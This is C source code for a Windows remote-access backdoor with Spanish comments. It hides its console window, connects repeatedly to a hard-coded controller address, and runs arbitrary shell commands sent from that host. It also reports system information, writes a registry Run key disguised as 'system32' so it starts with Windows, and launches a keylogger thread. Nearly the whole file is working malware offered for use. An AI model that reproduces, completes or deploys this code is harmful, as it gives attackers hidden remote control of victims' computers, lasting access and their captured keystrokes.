#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <direct.h> // _getcwd
#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size))
#define MAX_BUFFER_SIZE 1024

int sock;

/*
pipe2()
dup2()

*/

// Función para ejecutar al inicio
int bootRun()
{
    char err[128] = "Failed\n";
    char suc[128] = "Created persistence key at: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    HKEY NewVal;

    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(NewVal, TEXT("system32"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    // Si todo salió bien
    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc), 0);
    return 0;
}

// Función para recortar una cadena como "cd algo"
// Uso: str_cut(buffer, start, end)
char* str_cut(char str[], int slice_from, int slice_to)
{
    if (str[0] == '\0')
        return NULL;

    char* buffer;
    size_t str_len, buffer_len;

    if (slice_to < 0 && slice_from > slice_to) {
        str_len = strlen(str);
        if (abs(slice_to) > str_len - 1)
            return NULL;

        if (abs(slice_from) > str_len)
            slice_from = (-1) * str_len;

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);

    } else if (slice_from >= 0 && slice_to > slice_from) {
        str_len = strlen(str);

        if (slice_from > str_len - 1)
            return NULL;
        buffer_len = slice_to - slice_from;
        str += slice_from;

    } else
        return NULL;

    buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;
}

char* get_system_info() {
    char a[254] = "";

    SYSTEM_INFO sys_info;
    GetSystemInfo(&sys_info);

    OSVERSIONINFO os_info;
    os_info.dwOSVersionInfoSize = sizeof(os_info);
    GetVersionEx(&os_info);

    MEMORYSTATUSEX mem_info;
    mem_info.dwLength = sizeof(mem_info);
    GlobalMemoryStatusEx(&mem_info);

    sprintf(a, "{\"os_name\":\"%s\",\"os_version\":%d.%d,\"cpu_architecture\":%d,\"page_size\":%u,\"processor_count\":%u,\"total_physical_memory\":%llu,\"free_physical_memory\":%llu,\"total_virtual_memory\":%llu,\"free_virtual_memory\":%llu}",
        os_info.szCSDVersion,
        os_info.dwMajorVersion,
        os_info.dwMinorVersion,
        sys_info.wProcessorArchitecture,
        sys_info.dwPageSize,
        sys_info.dwNumberOfProcessors,
        mem_info.ullTotalPhys,
        mem_info.ullAvailPhys,
        mem_info.ullTotalVirtual,
        mem_info.ullAvailVirtual
    );

    send(sock, a, sizeof(a), 0);
    return 0;
}

void send_cwd() {
    char cwd[1024]; // MAX_PATH 256 
    char *cwd_p = &cwd;

    //if (_getcwd(cwd, sizeof(cwd)) == NULL) {
    if ( (cwd_p = _getcwd(NULL, 1023)) == NULL) {
        perror("Error al obtener el directorio actual");
        return;
    }
    
    else {
        strcat(cwd, "\r\n");
        if (send(sock, cwd, sizeof(cwd), 0) < 0) {
            perror("Error al enviar el directorio actual");
        }
    }
    //free(cwd);
    fflush(stdout); // Enviar datos de la secuencia de salida estándar de inmediato
}

void help() {
    char buffer[1024];
    strcpy(buffer, "holla ayudaaaaa");

    ssize_t bytesSent = send(sock, buffer, sizeof(buffer), 0);
    if (bytesSent == -1) {
        perror("Error al enviar datos a través del socket");
        // Puedes agregar lógica adicional en caso de error
    }
}

void Shell() {
    char buffer[MAX_BUFFER_SIZE];
    char container[MAX_BUFFER_SIZE];
    char total_response[18384];
    int buffer_pos = 0;
    int command_complete = 0;

    while (1) {
        bzero(buffer, MAX_BUFFER_SIZE);
        bzero(container, MAX_BUFFER_SIZE);
        bzero(total_response, sizeof(total_response));

        while (!command_complete) {
            ssize_t bytesReceived = recv(sock, buffer + buffer_pos, MAX_BUFFER_SIZE - buffer_pos, 0);
            if (bytesReceived <= 0) {
                // Error o conexión cerrada por el cliente
                perror("Error al recibir datos del socket");
                // Puedes agregar lógica adicional en caso de error
                break;
            }

            buffer_pos += bytesReceived;

            // Buscar el carácter de finalización del comando ('\n' o '\0')
            for (int i = 0; i < buffer_pos; i++) {
                if (buffer[i] == '\n' || buffer[i] == '\0') {
                    buffer[i] = '\0'; // Terminar el comando en el carácter de finalización
                    command_complete = 1; // Marcar que se ha recibido un comando completo
                    break;
                }
            }

            // Si el búfer está lleno y no se ha encontrado el carácter de finalización,
            // considerar que el comando está incompleto y descartarlo
            if (buffer_pos >= MAX_BUFFER_SIZE && !command_complete) {
                command_complete = 1; // Forzar finalización del comando incompleto
                buffer_pos = 0; // Descartar el comando incompleto
        
            }
        }

        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);
            WSACleanup();
            exit(0);
        } else if (strncmp("help", buffer, 4) == 0) {
            help();
        } else if (strncmp("pwd", buffer, 3) == 0) {
            send_cwd();
        } else if (strncmp("ls", buffer, 2) == 0) {
            // ls   
        } else if (strncmp("put", buffer, 2) == 0) {
            // put
        } else if (strncmp("get", buffer, 2) == 0) {
            // get
        }
        else if (strncmp("sys", buffer, 3) == 0) {
            get_system_info();
        } else if (strncmp("cd ", buffer, 3) == 0) {
            chdir(str_cut(buffer, 3, MAX_BUFFER_SIZE));
        } else if (strncmp("per", buffer, 3) == 0) {
            bootRun();
        } else if (strncmp("kl", buffer, 2) == 0) {
            HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
        } else {
            FILE *fp;
            fp = _popen(buffer, "r");
            if (fp != NULL) {
                while (fgets(container, MAX_BUFFER_SIZE, fp) != NULL) {
                    strcat(total_response, container);
                }
                fclose(fp);
            } else {
                perror("Error al ejecutar el comando");
            }
            send(sock, total_response, sizeof(total_response), 0);
        }
        // Restablecer variables para el siguiente comando
        
        buffer_pos = 0;
        command_complete = 0;
        
        
    }
}

// Asegúrate de tener la biblioteca keylogger.h y las bibliotecas requeridas en el código 
// (stdio.h, stdlib.h, unistd.h, winsock2.h, windows.h, winuser.h, wininet.h, windowsx.h, string.h, sys/stat.h, sys/types.h) antes de compilar y ejecutar el código.


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int cNmdShow) {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 0);

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    ServIP = "192.168.1.47";
    ServPort = 50001;

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        perror("Error al crear el socket");
        exit(1);
    }

    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(ServPort);

    start:
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
        Sleep(10);
        goto start;
    }

    Shell();
}
